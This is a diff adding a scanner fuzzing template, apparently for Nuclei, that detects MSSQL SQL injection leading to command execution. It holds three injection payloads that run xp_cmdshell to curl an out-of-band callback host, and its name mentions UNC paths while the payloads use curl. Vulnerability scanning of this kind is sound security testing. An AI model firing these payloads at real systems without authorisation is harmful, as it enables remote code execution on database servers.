@@ -1,0 +1,34 @@
+id: ai-fuzz-xp-cmdshell-oob
+
+info:
+  name: MSSQL xp_cmdshell UNC path OOB
+  author: openai
+  severity: high
+  tags: mssql,rce,sqli,oob,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      dirtree:
+        - "1; exec xp_cmdshell 'curl http://{{interactsh-url}}/abc'--"
+        - "1'; exec xp_cmdshell 'curl http://{{interactsh-url}}/abc'--"
+        - "1\"; exec xp_cmdshell 'curl http://{{interactsh-url}}/abc'--"
+
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{dirtree}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+          - http
